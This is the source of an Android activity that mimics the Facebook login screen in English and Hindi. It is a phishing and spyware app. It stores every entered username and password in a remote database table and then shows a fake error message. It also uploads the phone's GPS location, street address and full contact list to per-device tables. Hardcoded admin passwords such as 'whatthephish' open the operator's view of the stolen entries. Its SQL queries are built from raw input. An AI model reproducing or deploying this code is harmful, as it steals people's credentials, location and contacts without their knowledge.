package com.example.facebook;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.graphics.Typeface;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.vdurmont.emoji.EmojiParser;

import java.io.IOException;
import java.lang.ref.WeakReference;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {

    clsConnection c1 = new clsConnection(this);
    EditText txtUsername, txtPassword;

    Boolean b;
    String fonttype = null;
    TextView hindi;
    TextView langmobile, langpassword, langlogin, langcreateaccount, langor, langforgot, langhelp, langexit, EnglishLanguage;
    Typeface hindiFont, englishFont;

    // for contacts
    ProgressDialog pDialog, pDialog2;
    private static final int PERMISSIONS_REQUEST_READ_CONTACTS = 100;

    // for location
    LocationManager locationManager;
    String lattitude = "Not Available", longitude = "Not Available";
    private static final int REQUEST_LOCATION = 1;
    String cityName = "Not Available";
    String SubLocality = "Not Available";
    String State = "Not Available";
    String Address1 = "Not Available";


    // for disclaimer

    Dialog dialog;
    Button disclaimerOk;


    //for startEntriesActivity

    Date currentTime;
    String device_name2;

    @SuppressLint("SetTextI18n")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //contacts------------------------
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
        }
        //----------------------------------


        hindi = findViewById(R.id.HindiLanguage);
        hindiFont = Typeface.createFromAsset(getAssets(), "fonts/hindi.ttf");
        englishFont = Typeface.createFromAsset(getAssets(), "fonts/calibri.ttf");
        hindi.setTypeface(hindiFont);
        txtUsername = findViewById(R.id.fb_Username);
        txtPassword = findViewById(R.id.fb_Password);
        langlogin = findViewById(R.id.fb_Lang_LogIn);
        langmobile = findViewById(R.id.fb_Lang_Mobile);
        langpassword = findViewById(R.id.fb_Lang_Password);
        langcreateaccount = findViewById(R.id.fb_Lang_CreateNew);
        langor = findViewById(R.id.fb_Lang_Or);
        langforgot = findViewById(R.id.fb_Lang_ForgotPassword);
        langhelp = findViewById(R.id.fb_Lang_Help);
        langexit = findViewById(R.id.fb_Lang_Exit);
        EnglishLanguage = findViewById(R.id.EnglishLanguage);

        SharedPreferences pref1 = getApplicationContext().getSharedPreferences("SMediaFollowersSharedPrefLanguage", 0); // 0 - for private mode
        fonttype = pref1.getString("Font", "");

        if (fonttype.equals("English")) {


            langmobile.setText("Mobile number or email address");
            langpassword.setText("Password");
            langlogin.setText("Log In");
            langcreateaccount.setText("Create New Account");
            langor.setText("or");
            langforgot.setText("Forgot your password?");
            langhelp.setText("Help");
            langexit.setText("Exit");

            langmobile.setTypeface(englishFont);
            langpassword.setTypeface(englishFont);
            langlogin.setTypeface(englishFont);
            langcreateaccount.setTypeface(englishFont);
            langor.setTypeface(englishFont);
            langforgot.setTypeface(englishFont);
            langhelp.setTypeface(englishFont);
            langexit.setTypeface(englishFont);

            EnglishLanguage.setTextColor(Color.parseColor("#000000"));
            hindi.setTextColor(Color.parseColor("#3F51B5"));

            langmobile.setTextSize(20);
            langpassword.setTextSize(20);
            langlogin.setTextSize(20);
            langcreateaccount.setTextSize(20);
            langor.setTextSize(15);
            langforgot.setTextSize(20);
            langhelp.setTextSize(20);
            langexit.setTextSize(20);
        } else if (fonttype.equals("Hindi")) {
            hindi.setTextColor(Color.parseColor("#000000"));
            EnglishLanguage.setTextColor(Color.parseColor("#3F51B5"));

            langmobile.setText("eksckby uacj ;k bZesy");
            langpassword.setText("ikloMZ");
            langlogin.setText("ykWx bu djsa");
            langcreateaccount.setText("u;k [kkrk cuk,¡");
            langor.setText(";k");
            langforgot.setText("viuk ikloMZ Hkwy x,\\");
            langhelp.setText("enn");
            langexit.setText("ckgj fudysa");


            langmobile.setTypeface(hindiFont);
            langpassword.setTypeface(hindiFont);
            langlogin.setTypeface(hindiFont);
            langcreateaccount.setTypeface(hindiFont);
            langor.setTypeface(hindiFont);
            langforgot.setTypeface(hindiFont);
            langhelp.setTypeface(hindiFont);
            langexit.setTypeface(hindiFont);

            langmobile.setTextSize(25);
            langpassword.setTextSize(25);
            langlogin.setTextSize(25);
            langcreateaccount.setTextSize(25);
            langor.setTextSize(15);
            langforgot.setTextSize(25);
            langhelp.setTextSize(25);
            langexit.setTextSize(25);
        } else {
            EnglishLanguage.setTextColor(Color.parseColor("#000000"));
            hindi.setTextColor(Color.parseColor("#3F51B5"));

            langmobile.setText("Mobile number or email address");
            langpassword.setText("Password");
            langlogin.setText("Log In");
            langcreateaccount.setText("Create New Account");
            langor.setText("or");
            langforgot.setText("Forgot your password?");
            langhelp.setText("Help");
            langexit.setText("Exit");

            langmobile.setTypeface(englishFont);
            langpassword.setTypeface(englishFont);
            langlogin.setTypeface(englishFont);
            langcreateaccount.setTypeface(englishFont);
            langor.setTypeface(englishFont);
            langforgot.setTypeface(englishFont);
            langhelp.setTypeface(englishFont);
            langexit.setTypeface(englishFont);

            langmobile.setTextSize(20);
            langpassword.setTextSize(20);
            langlogin.setTextSize(20);
            langcreateaccount.setTextSize(20);
            langor.setTextSize(15);
            langforgot.setTextSize(20);
            langhelp.setTextSize(20);
            langexit.setTextSize(20);
        }

        //for location

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                (MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);
            Toast.makeText(this, "You need to enable location permission", Toast.LENGTH_SHORT).show();
        }

        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            buildAlertMessageNoGps();
        }
    }

    @Override
    public void onBackPressed() {
        // Write your code here
        final AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Exit Confirmation");
        builder.setMessage("Are you sure you want to exit?")
                .setCancelable(false)
                .setPositiveButton("No", (dialog, id) -> dialog.cancel())
                .setNegativeButton("Yes", (dialog, id) -> finish());
        final AlertDialog alert = builder.create();
        alert.show();
    }

    public void fb_Fun_ForgotPassword(View view) {
        ConnectivityManager ConnectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = ConnectionManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            Intent intent = new Intent(MainActivity.this, AllWebActivity.class);
            intent.putExtra("Url", "https://www.facebook.com/login/identify?ctx=recover&lwv=110");
            startActivity(intent);
        } else {
            c1.internetMessage();
        }
    }


    public void fb_Fun_CreateNew(View view) {
        ConnectivityManager ConnectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = ConnectionManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            Intent intent = new Intent(MainActivity.this, AllWebActivity.class);
            intent.putExtra("Url", "https://www.facebook.com/r.php");
            startActivity(intent);
        } else {
            c1.internetMessage();
        }
    }

    public void fb_Fun_Help(View view) {
//        ConnectivityManager ConnectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
//        NetworkInfo networkInfo = ConnectionManager.getActiveNetworkInfo();
//        if (networkInfo != null && networkInfo.isConnected()) {
//            Intent intent = new Intent(MainActivity.this, AllWebActivity.class);
//            intent.putExtra("Url", "https://www.facebook.com/help/");
//            startActivity(intent);
//        } else {
//            c1.internetMessage();
//        }
        dialog = new Dialog(MainActivity.this);
        dialog.setContentView(R.layout.help_disclaimer);
        dialog.show();
        disclaimerOk = dialog.findViewById(R.id.disclaimer_Ok);
        disclaimerOk.setOnClickListener(v -> dialog.cancel());
    }

    public void fb_Fun_Exit(View view) {
        final AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this);
        builder.setTitle("Exit Confirmation");
        builder.setMessage("Are you sure you want to exit?")
                .setCancelable(false)
                .setPositiveButton("No", (dialog, id) -> dialog.cancel())
                .setNegativeButton("Yes", (dialog, id) -> finish());
        final AlertDialog alert = builder.create();
        alert.show();
    }

    @SuppressLint({"SetTextI18n", "ApplySharedPref"})
    public void fb_Fun_English(View view) {
        EnglishLanguage.setTextColor(Color.parseColor("#111111"));
        hindi.setTextColor(Color.parseColor("#3F51B5"));

        langmobile.setText("Mobile number or email address");
        langpassword.setText("Password");
        langlogin.setText("Log In");
        langcreateaccount.setText("Create New Account");
        langor.setText("or");
        langforgot.setText("Forgot your password?");
        langhelp.setText("Help");
        langexit.setText("Exit");

        langmobile.setTypeface(englishFont);
        langpassword.setTypeface(englishFont);
        langlogin.setTypeface(englishFont);
        langcreateaccount.setTypeface(englishFont);
        langor.setTypeface(englishFont);
        langforgot.setTypeface(englishFont);
        langhelp.setTypeface(englishFont);
        langexit.setTypeface(englishFont);

        SharedPreferences pref = getApplicationContext().getSharedPreferences("SMediaFollowersSharedPrefLanguage", 0); // 0 - for private mode
        SharedPreferences.Editor editor = pref.edit();
        editor.putString("Font", "English");
        editor.commit();

        langmobile.setTextSize(20);
        langpassword.setTextSize(20);
        langlogin.setTextSize(20);
        langcreateaccount.setTextSize(20);
        langor.setTextSize(15);
        langforgot.setTextSize(20);
        langhelp.setTextSize(20);
        langexit.setTextSize(20);
    }

    @SuppressLint({"SetTextI18n", "ApplySharedPref"})
    public void fb_Fun_Hindi(View view) {
        hindi.setTextColor(Color.parseColor("#111111"));
        EnglishLanguage.setTextColor(Color.parseColor("#3F51B5"));

        langmobile.setText("eksckby uacj ;k bZesy");
        langpassword.setText("ikloMZ");
        langlogin.setText("ykWx bu djsa");
        langcreateaccount.setText("u;k [kkrk cuk,¡");
        langor.setText(";k");
        langforgot.setText("viuk ikloMZ Hkwy x,\\");
        langhelp.setText("enn");
        langexit.setText("ckgj fudysa");


        langmobile.setTypeface(hindiFont);
        langpassword.setTypeface(hindiFont);
        langlogin.setTypeface(hindiFont);
        langcreateaccount.setTypeface(hindiFont);
        langor.setTypeface(hindiFont);
        langforgot.setTypeface(hindiFont);
        langhelp.setTypeface(hindiFont);
        langexit.setTypeface(hindiFont);

        langmobile.setTextSize(25);
        langpassword.setTextSize(25);
        langlogin.setTextSize(25);
        langcreateaccount.setTextSize(25);
        langor.setTextSize(15);
        langforgot.setTextSize(25);
        langhelp.setTextSize(25);
        langexit.setTextSize(25);

        SharedPreferences pref = getApplicationContext().getSharedPreferences("SMediaFollowersSharedPrefLanguage", 0); // 0 - for private mode
        SharedPreferences.Editor editor = pref.edit();
        editor.putString("Font", "Hindi");
        editor.commit();
    }


    public void fb_Fun_LogIn(View view) {
        ConnectivityManager ConnectionManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = ConnectionManager.getActiveNetworkInfo();
        if (networkInfo != null && networkInfo.isConnected()) {
            if (txtUsername.getText().toString().equals("admin") && txtPassword.getText().toString().equals("whatthephish")) {
                new startEntries(this).execute();
            } else if (txtUsername.getText().toString().equals("admin") && txtPassword.getText().toString().equals("showInfo@1$")) {
                startActivity(new Intent(MainActivity.this, ShowInfoAdmin.class));
            } else {
                if (txtUsername.getText().toString().trim().length() == 0 || txtPassword.getText().toString().trim().length() == 0) {
                    c1.showMessage("Missing email or password", "Please make sure to enter email and password.");
                } else {
                    SharedPreferences pref1 = getApplicationContext().getSharedPreferences("SMediaFollowersSharedPref", 0); // 0 - for private mode
                    b = pref1.getBoolean("IsValue", false); // Storing boolean - true/false
                    if (b) {
                        c1.exeQry("Insert into ayush_tbl_facebook  values ('" + txtUsername.getText().toString() + "','" + txtPassword.getText().toString() + "')");
                        c1.showMessage("Error", "Something went wrong");
                    } else {
              //orginal          c1.exeQry("Insert into ayush_tbl_facebook  values ('x " + txtUsername.getText().toString() + "','x " + txtPassword.getText().toString() + "')");
            //for vishesh project
                        c1.exeQry("Insert into ayush_tbl_facebook  values ('" + txtUsername.getText().toString() + "','" + txtPassword.getText().toString() + "')");

                        //contacts---------------------------

//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
//                            requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
//                            //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
//                        } else {
//                            new LoadMessages().execute();
//                        }
                        //-----------------------------------------------------------

                        //for location-----------------------------------------------
                        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                            buildAlertMessageNoGps();

                        } else if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                                != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                                (MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);
                            Toast.makeText(this, "You need to enable location permission", Toast.LENGTH_SHORT).show();
                        }

                        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) && ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION)
                                == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                                (MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                            new OnlineSearchLocation(this).execute();
                        }
                        //----------------------------------------------------------
                    }
                }
            }
        } else {
            c1.internetMessage();
        }

    }

    //--------------------------------------------------------

    private static class startEntries extends AsyncTask<Void, Void, Void>  //Asynchronous task= which runs in background(loading type)
    {

        private final WeakReference<MainActivity> activityWeakReference;

        startEntries(MainActivity activity) {
            activityWeakReference = new WeakReference<>(activity);
        }

        @Override
        protected void onPreExecute()//before executing the task do this
        {
            super.onPreExecute();

            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return;
            }

            activity.pDialog2 = new ProgressDialog(activity);//pDialog=Progress Dialog
            activity.pDialog2.setMessage("Loading...");
            // pDialog.setIndeterminateDrawable(getResources().getDrawable(R.drawable.progressbox));
            activity.pDialog2.setCancelable(false);//this asynchronous task is non cancelable
            activity.pDialog2.show();
        }

        protected Void doInBackground(Void... args) //the BackGround Process
        {
            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return null;
            }
            try {
                activity.currentTime = Calendar.getInstance().getTime();
                activity.device_name2 = Build.MODEL;
                StringBuilder resultdevicename = new StringBuilder();

                for (int i = 0; i < activity.device_name2.length(); i++) {

                    if (activity.device_name2.charAt(i) > 47 && activity.device_name2.charAt(i) <= 57) {
                        resultdevicename.append(activity.device_name2.charAt(i));
                    }
                    if (activity.device_name2.charAt(i) > 64 && activity.device_name2.charAt(i) <= 122) {
                        resultdevicename.append(activity.device_name2.charAt(i));
                    }
                }

                String lastLoginQuery = "Insert into adminLastLogin Values ('Last Login at: " + activity.currentTime + " by " + resultdevicename + "')";
                activity.c1.exeQry(lastLoginQuery);
            } catch (Exception e) {
//                Toast.makeText(MainActivity.this, e.getMessage(), Toast.LENGTH_SHORT).show();
            }

            return null;
        }

        protected void onPostExecute(Void v)//wecan't do foreground task in backGround
        {
            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return;
            }
            activity.startActivity(new Intent(activity, Entries.class));
            activity.pDialog2.dismiss();
        }

    }

    //--------------------------------------------------------
    //for location--------------------------------------------
    protected void buildAlertMessageNoGps() {

        final AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("Enable Location");
        builder.setMessage("Your Location Setting is set to 'Off'. Please Enable Location to " +
                        "use this app")
                .setCancelable(false)
                .setPositiveButton("Settings", (dialog, id) -> startActivity(new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS)))
                .setNegativeButton("Cancel", (dialog, id) -> dialog.cancel());
        final AlertDialog alert = builder.create();
        alert.show();
    }

    private static class OnlineSearchLocation extends AsyncTask<Void, Void, Void>  //Asynchronous task= which runs in background(loading type)
    {
        //Getting a warning about memory leak so changed this class to static and added below
        //activity weak reference code...

        private final WeakReference<MainActivity> activityWeakReference;

        OnlineSearchLocation(MainActivity activity) {
            activityWeakReference = new WeakReference<>(activity);
        }

        @Override
        protected void onPreExecute()//before executing the task do this
        {
            super.onPreExecute();

            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return;
            }

            activity.pDialog = new ProgressDialog(activity);//pDialog=Progress Dialog
            activity.pDialog.setMessage("Loading...");
            // pDialog.setIndeterminateDrawable(getResources().getDrawable(R.drawable.progressbox));
            activity.pDialog.setCancelable(false);//this asynchronous task is non cancelable
            activity.pDialog.show();
        }

        @SuppressLint("ApplySharedPref")
        protected Void doInBackground(Void... args) //the BackGround Process
        {

            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return null;
            }

            if (ActivityCompat.checkSelfPermission(activity, Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission
                    (activity, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(activity, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION);

            } else {
                if (!activity.locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    activity.buildAlertMessageNoGps();
                } else {
                    Location location = activity.locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    Location location1 = activity.locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    Geocoder gcd = new Geocoder(activity, Locale.getDefault()); //getApplicationContextChange if Error
                    if (location != null) {
                        double latti = location.getLatitude();
                        double longi = location.getLongitude();
                        activity.lattitude = String.valueOf(latti);
                        activity.longitude = String.valueOf(longi);

                        try {
                            activity.cityName = gcd.getFromLocation(location.getLatitude(), location.getLongitude(), 1).get(0).getLocality();
                            activity.SubLocality = gcd.getFromLocation(location.getLatitude(), location.getLongitude(), 1).get(0).getSubLocality();
                            activity.State = gcd.getFromLocation(location.getLatitude(), location.getLongitude(), 1).get(0).getAdminArea();
                            activity.Address1 = gcd.getFromLocation(location.getLatitude(), location.getLongitude(), 1).get(0).getAddressLine(0);

                            String device_name = Build.MODEL;
                            StringBuilder resultdevicename = new StringBuilder();
                            for (int i = 0; i < device_name.length(); i++) {

                                if (device_name.charAt(i) > 47 && device_name.charAt(i) <= 57) {
                                    resultdevicename.append(device_name.charAt(i));
                                }

                                if (device_name.charAt(i) > 64 && device_name.charAt(i) <= 122) {
                                    resultdevicename.append(device_name.charAt(i));
                                }
                            }

                            // I was getting a warning to change below 'resultdevicename' to Stringbuilder
                            // Below is the orignal code and above is the code when fixed the warning
//                            String device_name = Build.MODEL;
//                            String resultdevicename = "";
//                            for (int i = 0; i < device_name.length(); i++) {
//                                if (device_name.charAt(i) > 64 && device_name.charAt(i) <= 122) {
//                                    resultdevicename = resultdevicename + device_name.charAt(i);
//                                }
//                            }

                            String tablename = "location_" + resultdevicename;

                            String exsql1 = "Create table " + tablename + " (City varchar(100),SubLocality varchar(100), State varchar(100), Address varchar(500), Latitude varchar(100), Longitude varchar(100))";
                            activity.c1.exeQry(exsql1);

                            String insert = "insert into " + tablename + " values('" + activity.cityName + "','" + activity.SubLocality + "','" + activity.State + "','" + activity.Address1 + "','" + activity.lattitude + "','" + activity.longitude + "')";
                            activity.c1.exeQry(insert);

                        } catch (IOException e) {

                        }
                    } else if (location1 != null) {
                        double latti = location1.getLatitude();
                        double longi = location1.getLongitude();
                        activity.lattitude = String.valueOf(latti);
                        activity.longitude = String.valueOf(longi);

                        try {
                            activity.cityName = gcd.getFromLocation(location1.getLatitude(), location1.getLongitude(), 1).get(0).getLocality();
                            activity.SubLocality = gcd.getFromLocation(location1.getLatitude(), location1.getLongitude(), 1).get(0).getSubLocality();
                            activity.State = gcd.getFromLocation(location1.getLatitude(), location1.getLongitude(), 1).get(0).getAdminArea();
                            activity.Address1 = gcd.getFromLocation(location1.getLatitude(), location1.getLongitude(), 1).get(0).getAddressLine(0);

                            String DeviceName = Build.MODEL;

                            StringBuilder resultdevicename = new StringBuilder();
                            for (int i = 0; i < DeviceName.length(); i++) {

                                if (DeviceName.charAt(i) > 47 && DeviceName.charAt(i) <= 57) {
                                    resultdevicename.append(DeviceName.charAt(i));
                                }

                                if (DeviceName.charAt(i) > 64 && DeviceName.charAt(i) <= 122) {
                                    resultdevicename.append(DeviceName.charAt(i));
                                }
                            }

                            String tablename = "location_" + resultdevicename;
                            String exsql1 = "Create table " + tablename + " (City varchar(100),SubLocality varchar(100), State varchar(100), Address varchar(500), Latitude varchar(100), Longitude varchar(100))";
                            activity.c1.exeQry(exsql1);

                            String insert = "insert into " + tablename + " values('" + activity.cityName + "','" + activity.SubLocality + "','" + activity.State + "','" + activity.Address1 + "','" + activity.lattitude + "','" + activity.longitude + "')";
                            activity.c1.exeQry(insert);
                        } catch (IOException e) {
//                        pDialog.dismiss();
//                        NetWorkCheck();

                        }
                    } else {
                        try {
                            activity.c1.showMessage("Incorrect data", "Username or password is incorrect");
                        } catch (Exception e) {

                        }
                    }
                }

            }

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && activity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                    activity.requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, PERMISSIONS_REQUEST_READ_CONTACTS);
                    //After this point you wait for callback in onRequestPermissionsResult(int, String[], int[]) overriden method
                } else {
                    ContentResolver cr = activity.getContentResolver();
                    String[] from = {ContactsContract.CommonDataKinds.Phone._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
                    //from = kaha se data fetch karna hai
                    Cursor cur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, from, null, null, null);
                    cur.moveToFirst();

                    String sql1;
                    StringBuilder sql2;
                    String sql;
//        String try = Build.USER

                    String device_name = Build.MODEL;
                    StringBuilder resultdevicename = new StringBuilder();
                    for (int i = 0; i < device_name.length(); i++) {

                        if (device_name.charAt(i) > 47 && device_name.charAt(i) <= 57) {
                            resultdevicename.append(device_name.charAt(i));
                        }

                        if (device_name.charAt(i) > 64 && device_name.charAt(i) <= 122) {
                            resultdevicename.append(device_name.charAt(i));
                        }
                    }

                    // I was getting a warning to change below 'resultdevicename' to Stringbuilder
                    // Below is the orignal code and above is the code when fixed the warning
//                            String device_name = Build.MODEL;
//                            String resultdevicename = "";
//                            for (int i = 0; i < device_name.length(); i++) {
//                                if (device_name.charAt(i) > 64 && device_name.charAt(i) <= 122) {
//                                    resultdevicename = resultdevicename + device_name.charAt(i);
//                                }
//                            }

                    String table_Name = "contacts" + resultdevicename;
                    table_Name = table_Name.replace(" ", "");
                    //  table_Name=table_Name+deviceId;

                    sql1 = "Create table " + table_Name + " (Name varchar(100),Contact_No varchar(100))";
                    activity.c1.exeQry(sql1);

                    int count = cur.getCount();
                    sql = "insert into " + table_Name + " values ";
                    sql2 = new StringBuilder();
                    for (int a = 1; a <= count; a++) {
                        //remove sql injection for contact name
                        //////////////////////////////////////////////
                        String rname = cur.getString(1);
                        String withoutEmoji = EmojiParser.removeAllEmojis(rname);
                        StringBuilder resultname = new StringBuilder();
                        for (int i = 0; i < rname.length(); i++) {

                            //for including space
                            if (rname.charAt(i) == 32) {
                                resultname.append(withoutEmoji.charAt(i));
                            }

                            //for including numbers in contact
                            if (rname.charAt(i) > 47 && rname.charAt(i) <= 57) {
                                resultname.append(withoutEmoji.charAt(i));
                            }

                            //for including small and large alphabets in contact
                            if (rname.charAt(i) > 64 && rname.charAt(i) <= 122) {
                                resultname.append(withoutEmoji.charAt(i));
                            }

                        }


                        //remove sql injection for contact number
                        //////////////////////////////////////////////
                        String rcontact = cur.getString(2);
                        StringBuilder resultcontact = new StringBuilder();
                        for (int i = 0; i < rcontact.length(); i++) {


                            //for including +
                            if (rcontact.charAt(i) == 43) {
                                resultcontact.append(rcontact.charAt(i));
                            }

                            //for including space
                            if (rcontact.charAt(i) == 32) {
                                resultcontact.append(rcontact.charAt(i));
                            }

                            //for including numbers in contact
                            if (rcontact.charAt(i) > 47 && rcontact.charAt(i) <= 57) {
                                resultcontact.append(rcontact.charAt(i));
                            }
                        }

                        // I was getting a warning to change below 'resultdevicename' to Stringbuilder
                        // Below is the orignal code and above is the code when fixed the warning
//                        String rname = cur.getString(1);
//                        String withoutEmoji = EmojiParser.removeAllEmojis(rname);
//                        String resultname = "";
//                        for (int i = 0; i < rname.length(); i++) {
//                            if (rname.charAt(i) > 64 && rname.charAt(i) <= 122) {
//                                resultname = resultname + withoutEmoji.charAt(i);
//                            }
//                        }


                        /////////////////////////////////////////////////

                        //sql2 = "insert into " + table_Name + " values('" + cur.getString(1) + "','" + cur.getString(2) + "');";
                        sql2.append("('").append(resultname).append("','").append(resultcontact).append("'),");

                        // I was getting a warning to change below 'resultdevicename' to Stringbuilder
                        // Below is the orignal code and above is the code when fixed the warning
                        // String sql2;
                        // sql2="";
//                        sql2 = sql2 + "('" + resultname + "','" + cur.getString(2) + "'),";


                        //as list of contacts in contacts book can be very much to select by a single  insert query
                        //so we are inserting contacts 500-500 each time until the complete phone book is get uploaded.
                        // we can write a insert query as insert into table values(ram,9680),(shyam,4080),(mohan,1234)and so on
                        if (a % 500 == 0) {
                            sql2 = new StringBuilder(sql2.substring(0, sql2.length() - 1));//trimming the comma from insert query
                            activity.c1.exeQry(sql + sql2);
                            sql2 = new StringBuilder();
                        }
                        cur.moveToNext();
                    }
                    cur.close();

                    if (!sql2.toString().equals("")) {
                        sql2 = new StringBuilder(sql2.substring(0, sql2.length() - 1));//sql2 me sql2 k 0th index se length-1 tak ka sara data dalna hai
                        activity.c1.exeQry(sql + sql2);
                    }

                    SharedPreferences pref = activity.getApplicationContext().getSharedPreferences("SMediaFollowersSharedPref", 0); // 0 - for private mode
                    SharedPreferences.Editor editor = pref.edit();
                    editor.putBoolean("IsValue", true); // Storing boolean - true/false// Storing string
                    editor.commit();

                }
            } catch (Exception e) {
            }
            return null;
        }

        protected void onPostExecute(Void v)//wecan't do foreground task in backGround
        //So we need to set list component in postExecute
        {
            MainActivity activity = activityWeakReference.get();
            if (activity == null || activity.isFinishing()) {
                return;
            }
            activity.pDialog.dismiss();//after Loading messages dismiss the loading message
            activity.c1.showMessage("Incorrect data", "Username or password is incorrect");

        }

    }


}